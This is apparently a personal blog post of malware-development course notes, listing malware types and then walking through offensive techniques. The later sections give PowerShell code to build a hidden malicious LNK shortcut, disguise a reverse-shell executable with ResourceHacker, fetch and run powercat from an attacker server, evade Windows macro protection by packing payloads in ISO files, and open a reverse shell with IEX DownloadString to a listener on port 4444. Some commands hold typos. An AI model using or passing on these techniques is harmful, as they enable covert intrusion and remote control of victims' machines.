---
layout: post
title: Just another test
date: 2023-06-20  9:00:00
categories: test
tags: tags
author: Mabd
---
* content
{:toc}


<img src="/assets/homeboy/back2.jpg" alt="drawing" />


# day one (Amr Thabet)

Created time: October 21, 2022 4:11 PM
Status: Done
Tags: Done


## What is a malware family?

<!-- <img style="float:right;filter: grayscale(100%);width:40%" src="/assets/homeboy/fam.png" /> -->

A malware family is **a program or set of associated programs with enough "code overlap" to be considered part of the same group**. Grouping them as a family broadens the scope of a single piece of  malware as it alters over time, creating a new piece of malware with  distinct family traits.



## Types of Malware applications

### 1. Trojans

A Trojan (or Trojan Horse) disguises itself as legitimate software 
with the purpose of tricking you into executing malicious software on 
your computer.

### 2. Spyware

Spyware invades your computer and attempts to steal your personal 
information such as credit card or banking information, web browsing 
data, and passwords to various accounts.

### 3. Adware

Adware is unwanted software that displays advertisements on your 
screen. Adware collects personal information from you to serve you with 
more personalized ads.

### 4. Rootkits

Rootkits enable unauthorized users to gain access to your computer without being detected.

### 5. Ransomware

Ransomware is designed to encrypt your files and block access to them until a ransom is paid.

### 6. Worms

A worm replicates itself by infecting other computers that are on the
 same network. They’re designed to consume bandwidth and interrupt 
networks.Like a virus, a worm can duplicate itself in other devices or systems. Unlike viruses, worms do not need human action to spread once they are in a network or system.

### 7. Keyloggers

Keyloggers keep track of your keystrokes on your keyboard and record 
them on a log. This information is used to gain unauthorized access to 
your accounts.

### 8. Botnet

A computer with a bot infection can spread the bot to other devices, creating what’s known as a botnet. This network of bot-compromised machines can then be controlled and used to launch massive attacks — such as DDoS attacks or brute force attacks

### 9. Virus

A virus infects other programs and can spread to other systems, in addition to performing its own malicious acts. A virus is attached to a file and is executed once the file is launched. The virus will then encrypt, corrupt, delete, or move your data and files.

## What lang to learn

- You will be using:
- Powershell (for scripting)
- C#(for full functional malware, easily integrated with Powershell Windows have auto testing for ps scripts now so people use C# it to run ps inside it  )
- C++ (for native access to windows functionality, also good for cross platform)
- VJ & VB
- Python (for automation & C&C development)

## You need to learn

- c++ for windows internals
- A little bit of c# & .NET

## What’s an APT Attack?

APT stands for “Advanced Persistent Threats”

Darkside Ransomware


[https://attack.mitre.org/#](https://attack.mitre.org/#)

[https://www.vx-underground.org/index.html](https://www.vx-underground.org/index.html) very rich place for malware

[https://zeltser.com/start-learning-malware-analysis/](https://zeltser.com/start-learning-malware-analysis/) amazing write onhow to start

## Initial Access - LNK File

LNK files are config file for the shortcuts on the desktop

Demo Example:

- Create a malicious LNK file to execute our malware
- Escalate Privileges using our LNK file
- Using Social Engineering to trick the user to allow our malware (Tools: Resource hacker)

PowerShell - Creat shourt cut in C:\Users\Public\ 

1. Tell powershell that we want to use  “ **ComObject** ” we can use inside program
    1. [wbscript.shell](http://wbscript.shell) is a program so know the $shell variable will be as aprogramm
    
    ```powershell
     $shell = New-Object -Comobject [WScript.shell](http://WScript.shell)
    ```
    
2. Creat the shortcut file .lnk will never apear to the user
   
    ```powershell
    $destination = “c:\Users\Public\index.html.lnk”
    $shortcut = $shell.CreatShortcut($detination)
    $shortcut.TargetPath = "c:\Users\IEUser\hello.txt" #el barnamij eli ra7 tsha8lo
    $shortcut.IconLocation = "c:\"
    $shortcut.Save()
    ```
    
    ## Download Virus on the victim machine
    
    - Fire a python file server
    - Get netcat ready and lessening
    - Start the script that will download the file from the files server and connect back to netcat
    
    Attacker side: 
    
    ```powershell
    python -m http.server 8000
    nc -vlp 4444
    ```
    
    Victim side: 
    
    ```powershell
     $shortcut.Arguments = “ ”
    ```
    
    This will work as an instructions in powershell the $shortcut path must be powershell.exe
    
    > iwr = Invoke Web request
    > 
    
    > The -OutFile part of the script will output the file under a new name in specefied path
    > 
    
    ```powershell
    iwr -Uri http://localhost:8000/powercat.ps1 -OutFile $env:temp\shell.exe;& $env:temp\shell.ps1
    ```
    
    We already created a shortcut so now we need to modify the path and add the argument
    
    ```powershell
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Argument = '-c "iwr -Uri http://localhost:8000/powercat.ps1 -OutFile $env:temp\shell.exe;& $env:temp\shell.ps1"'
    $shortcut.WindowStyle = 7
    ```
    
    This is better than creating a shortcut → that will lunch a ps file with the command in the Argument
    
    ## Make The .exe file that have the code of the reverse shell believable
    
    Lets say we have a file that our shortcut will execute this can be reverse.exe so to make it look more legitimate we can use (ResourceHaker) 
    
    - Launch RH and select File then select open file contain recourse then  the original app like chrome
    - Action then save all resources to a res file then choose a path
    - Open the exe file with RH and then Action Add from a resource then choose the file you generated in the last step
    - Now the exe file will be more legitimate
    
    ## Are VBA Macros Really Disabled?
    
    > VBA = Visual basic for application
    > 
    
    Only the one’s that are downloaded from the internet to do that files that are downloaded from the internet are marked with an alternative stream called “Zone.Identifier”. These files are considered locked. To see the Zone.Identifier for a downloaded file:
    
    ```powershell
    Get-Content -path filenape.zip -stream Zone.Identifier
    ```
    
    ### Bypass Disabled Macros
    
    - We need to remove the Zone.Identefire from our files. To do so, we can compress the document and send it compressed.
    - Files compressed with ISO, IMG, VHD, VHDX don’t include zone.Idetifir (as they are mounted). So the bypass is to deliver the malware as an ISO.
    - Double click on the iso file will open a folder with a macro without Zone.Identifire
    - To compress the macro  into ISO use PackMyPayload
    
    > When compiling a payload for windows it depended on the target if it is a 64bit than use mingw64 and if it is a 32bit windows than mingw32
    > 
    
    ### Note: popup in Powershell/colo
    
    ```powershell
    $wshel = New-Object -ComObject WScript
    $wshel.Popup("Hello World", 0, "Done", 0X1)
    ```
    
    - What are .ps1 files?
      
        A script is **a plain text file that contains one or more PowerShell commands**.
        PowerShell scripts have a . ps1 file extension. Running a script is a 
        lot like running a cmdlet. You type the path and file name of the script
        and use parameters to submit data and set options.
        
    
    ### Note make a batsh file that will execute a powershell file
    
    1. Make Powershell file popup.ps1
       
        ```powershell
        $wshel = New-Object -ComObject WScript
        $wshel.Popup("Hello World", 0, "Done", 0X1)
        ```
        
    2. Make batsh file safefile.bat
    
    ```powershell
    Powershell.exe -executionpolicy remotesigned -File "C:\Users\IEUer\Desktop\popup.ps1"
    ```
    
    ## Reverse shell on windows
    
    Powercat is script in power shell that give us the functionality of netcat so we want the to get the script on the target machine and the make call using powercat to our listing nc. 
    
    - Serve the powercat.ps1 file on simple server python -m http.server 80
    - Start nc -vlp 4444
    - On the target machine the following powershell must be executed
    - 
    
    ```powershell
    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.200.149:80/powercat.ps1');powercat -c 192.168.200.149 -p 4444 -e cmd"
    ```
    

